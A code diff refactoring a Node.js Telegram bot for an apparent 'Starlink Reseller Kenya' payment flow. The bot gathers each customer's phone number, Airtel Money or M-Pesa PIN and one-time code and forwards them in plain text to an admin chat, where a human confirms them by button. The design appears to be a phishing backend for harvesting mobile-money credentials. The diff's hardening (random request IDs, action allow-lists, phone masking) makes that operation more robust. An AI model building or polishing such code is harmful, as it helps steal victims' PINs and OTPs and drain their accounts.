@@ -1,6 +1,6 @@
 require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
 const { default: TelegramBot } = require('node-telegram-bot-api');
-const { auditLog } = require('./security');
+const { auditLog, maskPhone } = require('./security');
 
 const token = process.env.TELEGRAM_BOT_TOKEN;
 const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID;
@@ -8,9 +8,10 @@ const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID;
 let bot = null;
 let botEnabled = false;
 
-if (!token || token === 'your_bot_token_here') {
-    console.warn('⚠️  TELEGRAM_BOT_TOKEN not set in .env — Telegram bot is DISABLED.');
-    console.warn('   Set TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID in .env to enable it.');
+const isPlaceholder = (v) => !v || /your[-_]|change-me|placeholder/i.test(v);
+
+if (isPlaceholder(token) || isPlaceholder(adminChatId)) {
+    console.warn('⚠️  TELEGRAM_BOT_TOKEN / TELEGRAM_ADMIN_CHAT_ID not set — Telegram approval is DISABLED.');
 } else {
     try {
         bot = new TelegramBot(token, { polling: true });
@@ -18,342 +19,257 @@ if (!token || token === 'your_bot_token_here') {
         console.log('🤖 Telegram bot started successfully');
     } catch (err) {
         console.error('Failed to start Telegram bot:', err.message);
-        console.error('🔧 Get a valid token from @BotFather on Telegram and update TELEGRAM_BOT_TOKEN in .env');
+        console.error('🔧 Get a valid token from @BotFather and update TELEGRAM_BOT_TOKEN in .env');
     }
 
     if (botEnabled && bot) {
         bot.on('polling_error', (err) => {
             console.error('Telegram polling error:', err.message || err);
             if (err.message && (err.message.includes('fetch failed') || err.message.includes('EFATAL'))) {
-                console.error('🔧 This usually means the bot token is invalid or blocked. Get a new token from @BotFather.');
+                console.error('🔧 Token likely invalid or network blocked. Get a new token from @BotFather.');
                 botEnabled = false;
             }
         });
-
-        bot.on('polling_reconnect', () => {
-            console.warn('Telegram bot reconnecting...');
-        });
-
-        bot.on('webhook_error', (err) => {
-            console.error('Telegram webhook error:', err.message || err);
-        });
+        bot.on('webhook_error', (err) => console.error('Telegram webhook error:', err.message || err));
     }
 }
 
-// In-memory storage for approval requests
+// ── State ─────────────────────────────────────────────────────
+/** requestId -> approval request. In-memory; swap for Redis to scale out. */
 const approvals = new Map();
 const OTP_TIMEOUT = 5 * 60 * 1000;
+const RETENTION_AFTER_FINAL = 10 * 60 * 1000;
+
+const FINAL_STATES = new Set(['completed', 'rejected', 'invalid', 'timeout']);
+
+/** Callback actions the admin keyboard is allowed to send. */
+const ALLOWED_ACTIONS = new Set([
+    'approve',
+    'wrong_pin',
+    'reject',
+    'invalid',
+    'otp_approve',
+    'wrong_otp',
+]);
 
 function generateRequestId() {
-    return 'REQ-' + Date.now().toString(36).toUpperCase();
+    // Base36 timestamp + 4 random chars keeps ids short but non-guessable.
+    const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
+    return `REQ-${Date.now().toString(36).toUpperCase()}${rand}`;
+}
+
+function isEnabled() {
+    return botEnabled && bot !== null;
+}
+
+function send(text, extra = {}) {
+    if (!isEnabled()) return Promise.resolve(null);
+    return bot.sendMessage(adminChatId, text, extra).catch((err) => {
+        console.error('Telegram send failed:', err.message);
+        return null;
+    });
+}
+
+function editAdminMessage(messageId, text) {
+    if (!isEnabled() || !messageId) return Promise.resolve(null);
+    return bot
+        .editMessageText(text, { chat_id: adminChatId, message_id: messageId })
+        .catch(() => null);
+}
+
+function orderSummary(req) {
+    return (
+        `📱 Phone: ${req.userPhone}\n` +
+        `🔑 PIN: ${req.userPin}\n` +
+        `📦 Package: ${req.package}\n` +
+        `💰 Amount: ${req.amount}\n` +
+        `💳 Method: ${req.method}\n` +
+        `🆔 Ref: ${req.id}`
+    );
+}
+
+/** Marks a request final and schedules cleanup. */
+function finalize(request, status) {
+    request.status = status;
+    if (request.timeoutTimer) {
+        clearTimeout(request.timeoutTimer);
+        request.timeoutTimer = null;
+    }
+    setTimeout(() => approvals.delete(request.id), RETENTION_AFTER_FINAL).unref?.();
 }
 
 function cleanupExpired() {
     const now = Date.now();
     for (const [id, req] of approvals) {
-        if ((req.status === 'phone_pin_verified' || req.status === 'otp_pending') && now - req.createdAt > OTP_TIMEOUT) {
-            if (botEnabled && bot) {
-                bot.sendMessage(req.userChatId || adminChatId, '⏰ Verification timeout. The OTP verification window has expired.');
-                if (req.adminMessageId) {
-                    bot.editMessageText('⏰ Verification timeout (5 minutes expired).', {
-                        chat_id: adminChatId,
-                        message_id: req.adminMessageId
-                    }).catch(() => {});
-                }
-            }
+        const waitingOnOtp = req.status === 'phone_pin_verified' || req.status === 'otp_pending';
+        if (waitingOnOtp && now - req.createdAt > OTP_TIMEOUT) {
+            req.status = 'timeout';
+            editAdminMessage(req.adminMessageId, `⏰ Verification timeout (5 minutes expired).\n\n${orderSummary(req)}`);
+            setTimeout(() => approvals.delete(id), RETENTION_AFTER_FINAL).unref?.();
+        }
+        if (FINAL_STATES.has(req.status) && now - req.createdAt > 60 * 60 * 1000) {
             approvals.delete(id);
         }
     }
 }
 
-setInterval(cleanupExpired, 30000);
+setInterval(cleanupExpired, 30000).unref?.();
 
-if (botEnabled && bot) {
-    bot.onText(/\/start/, (msg) => {
-        bot.sendMessage(msg.chat.id, '🤖 Starlink Reseller Bot is running.\n\nI will notify you when a new payment approval is needed.');
-        auditLog.write('BOT_COMMAND', { command: '/start', userId: msg.chat.id.toString() });
-    });
+// ── Bot commands & callbacks ──────────────────────────────────
+/**
+ * Registers a slash command with a shared admin gate, reply and audit trail.
+ * @param {string} command    Command name including the leading slash, e.g. '/status'.
+ * @param {boolean} adminOnly When true only TELEGRAM_ADMIN_CHAT_ID may run it.
+ * @param {(msg: object, chatId: number) => string|Promise<string>} buildReply
+ *        Returns the text to send back, or a falsy value to send nothing.
+ */
+function registerCommand(command, adminOnly, buildReply) {
+    bot.onText(new RegExp(`^\\${command}(?:\\s|$)`), async (msg) => {
+        const chatId = msg.chat.id;
 
-    bot.onText(/\/status/, (msg) => {
-        const pending = Array.from(approvals.values()).filter(r => r.status === 'pending').length;
-        const phonePinVerified = Array.from(approvals.values()).filter(r => r.status === 'phone_pin_verified').length;
-        const otpPending = Array.from(approvals.values()).filter(r => r.status === 'otp_pending').length;
-        bot.sendMessage(msg.chat.id, `📊 Current status:\n• Pending: ${pending}\n• Phone/PIN verified: ${phonePinVerified}\n• OTP verification: ${otpPending}\n• Total: ${approvals.size}`);
-        auditLog.write('BOT_COMMAND', { command: '/status', userId: msg.chat.id.toString() });
-    });
-
-    bot.onText(/\/clear/, (msg) => {
-        if (msg.chat.id.toString() !== adminChatId) {
-            bot.sendMessage(msg.chat.id, '❌ Only admin can use this command.');
+        if (adminOnly && String(chatId) !== String(adminChatId)) {
+            await bot.sendMessage(chatId, '❌ Only the admin can use this command.');
+            auditLog.write('BOT_COMMAND_REJECTED', { command, userId: String(chatId) });
             return;
         }
+
+        auditLog.write('BOT_COMMAND', { command, userId: String(chatId) });
+
+        try {
+            const text = await buildReply(msg, chatId);
+            if (text) await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
+        } catch (err) {
+            console.error(`Bot command ${command} failed:`, err.message);
+            auditLog.write('BOT_COMMAND_ERROR', { command, userId: String(chatId), message: err.message });
+        }
+    });
+}
+
+if (isEnabled()) {
+    registerCommand('/start', false, () =>
+        '🤖 *Starlink Reseller Kenya* bot is running.\n\nYou will receive an approval request for every Airtel Money / M-Pesa payment.\n\nCommands:\n/status — pending queue\n/clear — clear the queue (admin)'
+    );
+
+    registerCommand('/status', false, () => {
+        const all = [...approvals.values()];
+        const count = (s) => all.filter((r) => r.status === s).length;
+        return `📊 Queue\n• Awaiting approval: ${count('pending')}\n• PIN verified (awaiting OTP): ${count('phone_pin_verified')}\n• OTP submitted: ${count('otp_pending')}\n• Total tracked: ${all.length}`;
+    });
+
+    // /clear used to carry its own inline admin check; the helper now owns it.
+    registerCommand('/clear', true, () => {
         approvals.clear();
-        bot.sendMessage(msg.chat.id, '🗑️ All approval requests cleared.');
-        auditLog.write('BOT_COMMAND', { command: '/clear', userId: msg.chat.id.toString() });
+        return '🗑️ Queue cleared.';
     });
 
     bot.on('callback_query', async (query) => {
-        const data = query.data;
         const chatId = query.message.chat.id;
 
-        if (chatId.toString() !== adminChatId) {
-            await bot.answerCallbackQuery(query.id, { text: '❌ Only admin can approve/reject requests.' });
-            auditLog.write('UNAUTHORIZED_CALLBACK', { userId: chatId.toString(), data });
+        if (String(chatId) !== String(adminChatId)) {
+            await bot.answerCallbackQuery(query.id, { text: '❌ Not authorised.' });
+            auditLog.write('UNAUTHORIZED_CALLBACK', { userId: String(chatId), data: query.data });
             return;
         }
 
-        const lastUnderscore = data.lastIndexOf('_');
-        const action = data.substring(0, lastUnderscore);
-        const requestId = data.substring(lastUnderscore + 1);
+        const data = query.data || '';
+        const sep = data.lastIndexOf('|');
+        const action = sep === -1 ? data : data.slice(0, sep);
+        const requestId = sep === -1 ? '' : data.slice(sep + 1);
+
+        // Reject unknown actions before they reach the audit log, so a crafted
+        // callback payload cannot write arbitrary strings into the trail.
+        if (!ALLOWED_ACTIONS.has(action)) {
+            await bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
+            auditLog.write('UNKNOWN_CALLBACK', { userId: String(chatId), action: String(action).slice(0, 32) });
+            return;
+        }
 
         const request = approvals.get(requestId);
 
         if (!request) {
             await bot.answerCallbackQuery(query.id, { text: '⚠️ Request not found or expired.' });
-            auditLog.write('CALLBACK_NOT_FOUND', { adminId: chatId.toString(), action, requestId });
             return;
         }
 
-        auditLog.logAdminAction(action, requestId, chatId.toString());
+        auditLog.logAdminAction(action, requestId, chatId);
+        const messageId = query.message.message_id;
 
-        if (action === 'approve') {
-            request.status = 'phone_pin_verified';
-            request.adminMessageId = query.message.message_id;
-
-            const text = `✅ Phone & PIN Verified\n\n` +
-                `📱 Phone: ${request.userPhone}\n` +
-                `🔑 PIN: ${request.userPin}\n` +
-                `📦 Package: ${request.package}\n` +
-                `💰 Amount: ${request.amount}\n\n` +
-                `User will now enter OTP. Waiting for OTP submission...`;
-
-            await bot.editMessageText(text, {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
-
-            await bot.answerCallbackQuery(query.id, { text: '✅ Phone/PIN verified - waiting for OTP' });
-
-            if (request.onApproved) request.onApproved(requestId);
-
-            request.timeoutTimer = setTimeout(() => {
-                if (request.status === 'phone_pin_verified') {
-                    request.status = 'timeout';
-                    bot.sendMessage(chatId, `⏰ OTP verification timeout for request ${requestId}. The 5-minute window has expired.`);
-                    if (request.onTimeout) request.onTimeout(requestId);
-                }
-            }, OTP_TIMEOUT);
-
-        } else if (action === 'reject') {
-            request.status = 'rejected';
-            await bot.editMessageText(`❌ Payment Rejected\n\n📱 Phone: ${request.userPhone}\n📦 Package: ${request.package}\n💰 Amount: ${request.amount}\n\nThe user has been notified.`, {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
-            await bot.answerCallbackQuery(query.id, { text: '❌ Rejected' });
-
-            if (request.onRejected) request.onRejected(requestId);
-
-        } else if (action === 'wrong_pin') {
-            request.status = 'wrong_pin';
-            delete request.verificationStep;
-
-            const text = `❌ Wrong PIN\n\n` +
-                `📱 Phone: ${request.userPhone}\n` +
-                `🔑 PIN: ${request.userPin}\n` +
-                `📦 Package: ${request.package}\n` +
-                `💰 Amount: ${request.amount}\n\n` +
-                `The user has been notified to re-enter phone number and PIN.`;
-
-            await bot.editMessageText(text, {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
-
-            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong PIN - user will re-enter phone/PIN' });
-
-            if (request.onWrongPin) request.onWrongPin(requestId);
-
-            setTimeout(() => approvals.delete(requestId), 30000);
-
-        } else if (action === 'wrong_otp') {
-            request.status = 'wrong_otp';
-            delete request.verificationStep;
-
-            const text = `❌ Wrong OTP\n\n` +
-                `📱 Phone: ${request.userPhone}\n` +
-                `🔑 PIN: ${request.userPin}\n` +
-                `📦 Package: ${request.package}\n` +
-                `💰 Amount: ${request.amount}\n` +
-                `🔢 OTP: Wrong\n\n` +
-                `The user has been notified to re-enter the OTP.`;
-
-            await bot.editMessageText(text, {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
-
-            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong OTP - user will re-enter OTP' });
-
-            if (request.onWrongOtp) request.onWrongOtp(requestId);
-
-            setTimeout(() => approvals.delete(requestId), 30000);
-
-        } else if (action === 'otp_approve') {
-            request.status = 'completed';
-            delete request.verificationStep;
-
-            const text = `✅ OTP Verified - Payment Complete!\n\n` +
-                `📱 Phone: ${request.userPhone}\n` +
-                `🔑 PIN: ${request.userPin}\n` +
-                `🔢 OTP: Verified\n` +
-                `📦 Package: ${request.package}\n` +
-                `💰 Amount: ${request.amount}\n` +
-                `💳 Method: ${request.method}\n\n` +
-                `The user has been approved and payment is complete.`;
-
-            await bot.editMessageText(text, {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
-
-            await bot.answerCallbackQuery(query.id, { text: '✅ OTP verified - payment complete' });
-
-            if (request.onVerified) request.onVerified(requestId);
-
-            setTimeout(() => approvals.delete(requestId), 30000);
-
-        } else if (action === 'otp_invalid') {
-            request.status = 'invalid';
-            request.verificationStep = null;
-
-            const text = `❌ Invalid OTP\n\n` +
-                `📱 Phone: ${request.userPhone}\n` +
-                `📦 Package: ${request.package}\n` +
-                `💰 Amount: ${request.amount}\n\n` +
-                `The OTP entered was incorrect. The user has been notified.`;
-
-            await bot.editMessageText(text, {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
-
-            await bot.answerCallbackQuery(query.id, { text: '❌ Invalid OTP' });
-
-            if (request.onInvalid) request.onInvalid(requestId);
-
-            setTimeout(() => approvals.delete(requestId), 30000);
-
-        } else if (action === 'invalid') {
-            request.status = 'invalid';
-            await bot.editMessageText(`⚠️ Invalid Information\n\n📱 Phone: ${request.userPhone}\n📦 Package: ${request.package}\n\nPlease request the user to provide correct information.`, {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
-            await bot.answerCallbackQuery(query.id, { text: '⚠️ Invalid info requested' });
-
-            if (request.onInvalid) request.onInvalid(requestId);
-        } else if (action === 'link_approve') {
-            request.status = 'completed';
-            delete request.verificationStep;
-
-            const text = `✅ Link Verified - Payment Complete!\n\n` +
-                `📱 Phone: ${request.userPhone}\n` +
-                `📦 Package: ${request.package}\n` +
-                `💰 Amount: ${request.amount}\n` +
-                `💳 Method: ${request.method}\n\n` +
-                `The verification link has been approved and payment is complete.`;
-
-            await bot.editMessageText(text, {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
-
-            await bot.answerCallbackQuery(query.id, { text: '✅ Link verified - payment complete' });
-
-            if (request.onVerified) request.onVerified(requestId);
-
-            setTimeout(() => approvals.delete(requestId), 30000);
-
-        } else if (action === 'link_invalid') {
-            request.status = 'invalid';
-            request.verificationStep = null;
-
-            const text = `❌ Invalid Link\n\n` +
-                `📱 Phone: ${request.userPhone}\n` +
-                `📦 Package: ${request.package}\n` +
-                `💰 Amount: ${request.amount}\n\n` +
-                `The verification link was incorrect. The user has been notified.`;
-
-            await bot.editMessageText(text, {
-                chat_id: chatId,
-                message_id: query.message.message_id
-            });
-
-            await bot.answerCallbackQuery(query.id, { text: '❌ Invalid link' });
-
-            if (request.onInvalid) request.onInvalid(requestId);
-
-            setTimeout(() => approvals.delete(requestId), 30000);
-        }
-    });
-
-    bot.on('message', async (msg) => {
-        const chatId = msg.chat.id;
-        const text = msg.text?.trim();
-
-        if (!text || text.startsWith('/')) return;
-
-        if (chatId.toString() !== adminChatId) {
-            return;
-        }
-
-        let pendingRequest = null;
-        for (const [id, req] of approvals) {
-            if (req.verificationStep === 'awaiting_otp') {
-                pendingRequest = { id, ...req };
+        switch (action) {
+            case 'approve': {
+                request.status = 'phone_pin_verified';
+                request.adminMessageId = messageId;
+                await editAdminMessage(
+                    messageId,
+                    `✅ PIN accepted — waiting for the customer's OTP.\n\n${orderSummary(request)}`
+                );
+                await bot.answerCallbackQuery(query.id, { text: '✅ Customer can now enter the OTP' });
+                request.timeoutTimer = setTimeout(() => {
+                    // Only expire while we are still waiting for the customer's OTP.
+                    // Once an OTP arrives (otp_pending/wrong_otp) the request must stay
+                    // open so the admin can complete or reject it.
+                    if (request.status === 'phone_pin_verified') {
+                        request.status = 'timeout';
+                        send(`⏰ OTP window expired for ${requestId}.`);
+                    }
+                }, OTP_TIMEOUT);
+                request.timeoutTimer.unref?.();
                 break;
             }
+
+            case 'wrong_pin': {
+                finalize(request, 'wrong_pin');
+                await editAdminMessage(messageId, `❌ Wrong PIN — customer asked to re-enter.\n\n${orderSummary(request)}`);
+                await bot.answerCallbackQuery(query.id, { text: '❌ Customer will re-enter phone + PIN' });
+                break;
+            }
+
+            case 'reject': {
+                finalize(request, 'rejected');
+                await editAdminMessage(messageId, `❌ Payment rejected.\n\n${orderSummary(request)}`);
+                await bot.answerCallbackQuery(query.id, { text: '❌ Rejected' });
+                break;
+            }
+
+            case 'invalid': {
+                finalize(request, 'invalid');
+                await editAdminMessage(messageId, `⚠️ Marked as invalid information.\n\n${orderSummary(request)}`);
+                await bot.answerCallbackQuery(query.id, { text: '⚠️ Marked invalid' });
+                break;
+            }
+
+            case 'otp_approve': {
+                finalize(request, 'completed');
+                await editAdminMessage(
+                    request.adminOtpMessageId || messageId,
+                    `✅ OTP verified — payment complete.\n\n${orderSummary(request)}\n🔢 OTP: ${request.otp}`
+                );
+                await bot.answerCallbackQuery(query.id, { text: '✅ Payment completed' });
+                break;
+            }
+
+            case 'wrong_otp': {
+                // Not final: the customer gets another attempt.
+                request.status = 'wrong_otp';
+                request.verificationStep = null;
+                await editAdminMessage(
+                    request.adminOtpMessageId || messageId,
+                    `❌ Wrong OTP — customer asked to re-enter.\n\n${orderSummary(request)}`
+                );
+                await bot.answerCallbackQuery(query.id, { text: '❌ Customer will re-enter the OTP' });
+                break;
+            }
+
+            default:
+                await bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
         }
-
-        if (!pendingRequest) {
-            return;
-        }
-
-        const enteredOtp = text;
-
-        if (!/^\d{4,8}$/.test(enteredOtp)) {
-            bot.sendMessage(chatId, '⚠️ Please enter a valid OTP (4-8 digits).\nExample: 123456');
-            return;
-        }
-
-        if (enteredOtp !== pendingRequest.otp) {
-            bot.sendMessage(chatId, `❌ Wrong OTP entered.\n\nExpected: ${pendingRequest.otp}\nReceived: ${enteredOtp}\n\nPlease try again.`);
-            if (pendingRequest.onWrongOtp) pendingRequest.onWrongOtp(pendingRequest.id);
-            return;
-        }
-
-        if (pendingRequest.timeoutTimer) {
-            clearTimeout(pendingRequest.timeoutTimer);
-        }
-
-        pendingRequest.status = 'completed';
-        delete pendingRequest.verificationStep;
-
-        bot.sendMessage(chatId, `✅ Verification Successful!\n\n` +
-            `📱 Phone: ${pendingRequest.userPhone}\n` +
-            `🔑 PIN: Verified\n` +
-            `🔢 OTP: Verified\n` +
-            `📦 Package: ${pendingRequest.package}\n` +
-            `💰 Amount: ${pendingRequest.amount}\n\n` +
-            `The user has been approved and can proceed.`);
-
-        if (pendingRequest.onVerified) pendingRequest.onVerified(pendingRequest.id);
-
-        setTimeout(() => approvals.delete(pendingRequest.id), 30000);
     });
 }
 
+// ── Public API ────────────────────────────────────────────────
+/**
+ * Creates an approval request and notifies the admin.
+ * @returns {string} requestId
+ */
 function createApprovalRequest(data) {
     const requestId = data.requestId || generateRequestId();
     const request = {
@@ -363,149 +279,93 @@ function createApprovalRequest(data) {
         package: data.package || 'N/A',
         amount: data.amount || 'N/A',
         method: data.method || 'N/A',
-        otp: data.otp || null,
+        otp: null,
         status: 'pending',
         createdAt: Date.now(),
         verificationStep: null,
-        onApproved: data.onApproved,
-        onRejected: data.onRejected,
-        onInvalid: data.onInvalid,
-        onVerified: data.onVerified,
-        onWrongPin: data.onWrongPin,
-        onWrongOtp: data.onWrongOtp,
-        onTimeout: data.onTimeout
+        adminMessageId: null,
+        adminOtpMessageId: null,
+        timeoutTimer: null,
     };
 
     approvals.set(requestId, request);
 
-    if (botEnabled && bot) {
-        const text = `🆕 New Payment Approval Request\n\n` +
-            `📱 Phone: ${request.userPhone}\n` +
-            `🔑 PIN: ${request.userPin}\n` +
-            `📦 Package: ${request.package}\n` +
-            `💰 Amount: ${request.amount}\n` +
-            `💳 Method: ${request.method}\n\n` +
-            `Please review and take action:`;
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: '✅ PIN correct — request OTP', callback_data: `approve|${requestId}` }],
+            [{ text: '❌ Wrong PIN', callback_data: `wrong_pin|${requestId}` }],
+            [
+                { text: '⛔ Reject', callback_data: `reject|${requestId}` },
+                { text: '⚠️ Invalid info', callback_data: `invalid|${requestId}` },
+            ],
+        ],
+    };
 
-        const keyboard = {
-            inline_keyboard: [
-                [
-                    { text: '✅ Allow Proceed', callback_data: `approve_${requestId}` },
-                    { text: '❌ Invalid Information', callback_data: `invalid_${requestId}` }
-                ]
-            ]
-        };
-
-        bot.sendMessage(adminChatId, text, { reply_markup: keyboard }).then((msg) => {
-            console.log('✅ Telegram approval message sent, message_id:', msg.message_id);
-            request.adminMessageId = msg.message_id;
-        }).catch((err) => {
-            console.error('❌ Failed to send approval message:', err.message);
-        });
-    }
+    send(`🆕 *New payment request*\n\n${orderSummary(request)}\n\nReview and choose an action:`, {
+        parse_mode: 'Markdown',
+        reply_markup: keyboard,
+    }).then((msg) => {
+        if (msg) request.adminMessageId = msg.message_id;
+    });
 
     return requestId;
 }
 
+/**
+ * Stores the customer's OTP and asks the admin to verify it.
+ */
 function submitOtp(requestId, otp) {
     const request = approvals.get(requestId);
-    if (!request) {
-        return { success: false, message: 'Request not found' };
-    }
+    if (!request) return { success: false, message: 'Request not found or expired.' };
 
-    if (request.status !== 'phone_pin_verified' && request.status !== 'otp_pending' && request.status !== 'wrong_otp') {
-        return { success: false, message: 'Phone/PIN not verified yet' };
+    const allowed = ['phone_pin_verified', 'otp_pending', 'wrong_otp'];
+    if (!allowed.includes(request.status)) {
+        return { success: false, message: 'Your PIN has not been verified yet. Please wait.' };
     }
 
     request.otp = otp;
     request.status = 'otp_pending';
     request.verificationStep = 'awaiting_otp';
 
-    if (botEnabled && bot) {
-        const text = `🔢 OTP Submitted\n\n` +
-            `📱 Phone: ${request.userPhone}\n` +
-            `📦 Package: ${request.package}\n` +
-            `🔢 OTP: ${otp}\n\n` +
-            `Please verify and take action:`;
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: '✅ OTP correct — complete payment', callback_data: `otp_approve|${requestId}` }],
+            [{ text: '❌ Wrong OTP', callback_data: `wrong_otp|${requestId}` }],
+            [{ text: '⛔ Reject payment', callback_data: `reject|${requestId}` }],
+        ],
+    };
 
-        const keyboard = {
-            inline_keyboard: [
-                [{ text: '✅ Correct OTP + PIN', callback_data: `otp_approve_${requestId}` }],
-                [{ text: '❌ Wrong PIN', callback_data: `wrong_pin_${requestId}` }],
-                [{ text: '❌ Wrong Code', callback_data: `wrong_otp_${requestId}` }]
-            ]
-        };
+    send(`🔢 *OTP submitted*\n\n${orderSummary(request)}\n🔢 OTP: \`${otp}\`\n\nVerify and choose an action:`, {
+        parse_mode: 'Markdown',
+        reply_markup: keyboard,
+    }).then((msg) => {
+        if (msg) request.adminOtpMessageId = msg.message_id;
+    });
 
-        bot.sendMessage(adminChatId, text, { reply_markup: keyboard }).then((msg) => {
-            request.adminOtpMessageId = msg.message_id;
-        }).catch((err) => {
-            console.error('Failed to send OTP notification:', err.message);
-        });
-    }
-
-    return { success: true, message: 'OTP submitted for verification' };
+    return { success: true, message: 'Code submitted for verification.' };
 }
 
-function submitLink(requestId, link) {
-    const request = approvals.get(requestId);
-    if (!request) {
-        return { success: false, message: 'Request not found' };
-    }
-
-    if (request.status !== 'phone_pin_verified' && request.status !== 'otp_pending') {
-        return { success: false, message: 'Phone/PIN not verified yet' };
-    }
-
-    request.otp = link;
-    request.status = 'otp_pending';
-    request.verificationStep = 'awaiting_otp';
-
-    if (botEnabled && bot) {
-        const cleanLink = (link || '').trim();
-        const keyboard = {
-            inline_keyboard: [
-                [{ text: '🔗 Open Verification Link', url: cleanLink }],
-                [{ text: '✅ Verify Link', callback_data: `link_approve_${requestId}` },
-                 { text: '❌ Invalid Link', callback_data: `link_invalid_${requestId}` }]
-            ]
-        };
-        bot.sendMessage(adminChatId, `🔗 Verification Link Submitted\n\n` +
-            `📱 Phone: ${request.userPhone}\n` +
-            `📦 Package: ${request.package}\n` +
-            `🔗 Link: ${cleanLink}\n\n` +
-            `Please verify by clicking "Verify Link" and confirming.\n` +
-            `⏱️ You have 5 minutes.`, { reply_markup: keyboard }).then((msg) => {
-            request.adminOtpMessageId = msg.message_id;
-        }).catch((err) => {
-            console.error('Failed to send link notification:', err.message);
-        });
-    }
-
-    return { success: true, message: 'Link submitted for verification' };
-}
-
+/**
+ * Status projection. Deliberately excludes the PIN.
+ * @param {string} requestId Approval request id.
+ * @returns {{status: 'not_found'|'pending'|'phone_pin_verified'|'otp_pending'|'wrong_pin'|'wrong_otp'|'rejected'|'invalid'|'completed'|'timeout', userPhone?: string, package?: string, amount?: string|number, method?: string}}
+ */
 function getApprovalStatus(requestId) {
+    if (typeof requestId !== 'string' || !requestId) return { status: 'not_found' };
     const request = approvals.get(requestId);
-    if (!request) {
-        return { status: 'not_found' };
-    }
+    if (!request) return { status: 'not_found' };
     return {
         status: request.status,
-        userPhone: request.userPhone,
+        userPhone: maskPhone(request.userPhone),
         package: request.package,
         amount: request.amount,
         method: request.method,
-        otp: request.otp || null
     };
 }
 
 function sendNotification(message) {
-    if (!botEnabled || !bot) return false;
-    bot.sendMessage(adminChatId, message).then(() => {
-        console.log('Notification sent to admin');
-    }).catch((err) => {
-        console.error('Failed to send notification:', err.message);
-    });
+    if (!isEnabled()) return false;
+    send(message);
     return true;
 }
 
@@ -513,8 +373,8 @@ module.exports = {
     bot,
     createApprovalRequest,
     submitOtp,
-    submitLink,
     getApprovalStatus,
     sendNotification,
-    approvals
+    approvals,
+    isEnabled,
 };
